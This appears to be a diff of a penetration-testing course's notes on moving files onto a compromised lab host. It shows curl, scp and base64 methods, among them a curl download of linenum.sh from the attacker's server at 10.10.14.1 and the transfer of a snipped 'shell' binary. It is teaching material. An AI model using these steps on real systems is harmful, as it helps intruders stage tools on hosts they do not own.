 ```
 
 Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:
@@ -1315,7 +1836,9 @@ Note that we used our IP `10.10.14.1` and the port our Python server runs on `80
 Transferring Files
 
 ```shell
-user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 100 144k 100 144k 0 0 176k 0 --:--:-- --:--:-- --:--:-- 176k
+user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+
+100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
 ```
 
 Note that we used the `-o` flag to specify the output file name.
@@ -1329,7 +1852,10 @@ Another method to transfer files would be using `scp`, granted we have obtained 
 Transferring Files
 
 ```shell
-6165@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh user@remotehost's password: ********* linenum.sh
+6165@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
+
+user@remotehost's password: *********
+linenum.sh
 ```
 
 Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.
@@ -1343,7 +1869,9 @@ In some cases, we may not be able to transfer the file. For example, the remote 
 Transferring Files
 
 ```shell
-6165@htb[/htb]$ base64 shell -w 0 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
+6165@htb[/htb]$ base64 shell -w 0
+
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
 ```
 
 Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
@@ -1351,7 +1879,7 @@ Now, we can copy this `base64` string, go to the remote host, and use `base64 -d
 Transferring Files
 
 ```shell
-user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA.. <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
 ```
 
 ___
@@ -1363,7 +1891,8 @@ To validate the format of a file, we can run the [file](https://linux.die.net/ma
 Transferring Files
 
 ```shell
-user@remotehost$ file shell shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+user@remotehost$ file shell
+shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
 ```
 
 As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
@@ -1371,7 +1900,9 @@ As we can see, when we run the `file` command on the `shell` file, it says that 
 Transferring Files
 
 ```shell
-6165@htb[/htb]$ md5sum shell 321de1d7e7c3735838890a72c9ae7d1d shell
+6165@htb[/htb]$ md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
 ```
 
 Now, we can go to the remote server and run the same command on the file we transferred:
@@ -1379,7 +1910,9 @@ Now, we can go to the remote server and run the same command on the file we tran
 Transferring Files
 
 ```shell
-user@remotehost$ md5sum shell 321de1d7e7c3735838890a72c9ae7d1d shell
+user@remotehost$ md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
 ```
 
 As we can see, both files have the same md5 hash, meaning the file was transferred correctly. There are various other methods for transferring files. You can check out the [File Transfers](https://academy.hackthebox.com/module/details/24) module for a more detailed study on transferring files.
@@ -1656,6 +2189,10 @@ The latest addition to `HackThebox` is `HTB Battlegrounds`.
 `Server Siege` mode is an attack-only style, in which the team who can hack the other team faster wins. You can find a detailed article about `HTB Battlegrounds` in this [link](https://help.hackthebox.com/en/articles/5185620-gs-how-to-play-battlegrounds).
 
 ---
+## Nibbles - Enumeration
+
+---
+
 There are 201 standalone boxes of various operating systems and difficulty levels available to us on the HTB platform with VIP membership when writing this. This membership includes an official HTB created walkthrough for each retired machine. We can also find blog and video walkthroughs for most boxes with a quick Google search.
 
 For our purposes, let us walk through the box `Nibbles`, an easy-rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.
